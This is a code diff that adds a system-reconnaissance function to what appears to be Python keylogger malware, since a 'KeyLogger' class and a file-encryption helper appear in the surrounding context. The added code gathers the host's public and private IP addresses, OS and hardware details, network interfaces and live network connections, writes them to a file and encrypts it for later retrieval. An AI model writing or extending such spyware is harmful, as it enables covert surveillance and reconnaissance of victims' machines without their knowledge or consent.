@@ -86,6 +86,46 @@ def encrypt_file(file_name, key):
     except Exception as e:
         print(f"Error encrypting file {file_name}: {e}")
 
+def gather_system_information(file_name, key):
+    try:
+        with open(file_name, "w") as f:
+            hostname = socket.gethostname()
+            IP_address = socket.gethostbyname(hostname)
+            try:
+                public_ip = get("https://api.ipify.org").text
+                f.write("Public IP Address: " + public_ip + '\n')
+            except Exception:
+                f.write("Couldn't get Public IP Address\n")
+
+            f.write("Processor: " + platform.processor() + '\n')
+            f.write("System: " + platform.system() + " " + platform.version() + '\n')
+            f.write("Machine: " + platform.machine() + '\n')
+            f.write("Hostname: " + hostname + '\n')
+            f.write("Private IP Address: " + IP_address + '\n')
+
+            # Network information
+            f.write("Network Information:\n")
+            for interface, addrs in psutil.net_if_addrs().items():
+                f.write(f"  Interface {interface}:\n")
+                for addr in addrs:
+                    f.write(f"    Address: {addr.address}\n")
+                    if addr.netmask:
+                        f.write(f"    Netmask: {addr.netmask}\n")
+                    if addr.broadcast:
+                        f.write(f"    Broadcast: {addr.broadcast}\n")
+
+            # Active connections
+            f.write("Current Network Connections:\n")
+            for conn in psutil.net_connections(kind='inet'):
+                f.write(f"  Local Address: {conn.laddr}\n")
+                if conn.raddr:
+                    f.write(f"  Remote Address: {conn.raddr}\n")
+                f.write(f"  Status: {conn.status}\n")
+            
+            encrypt_file(file_name, key)
+    except Exception as e:
+        print(f"Error gathering system information: {e}")
+
 class KeyLogger:
     def __init__(self, log_file, key):
         self.log_file = log_file
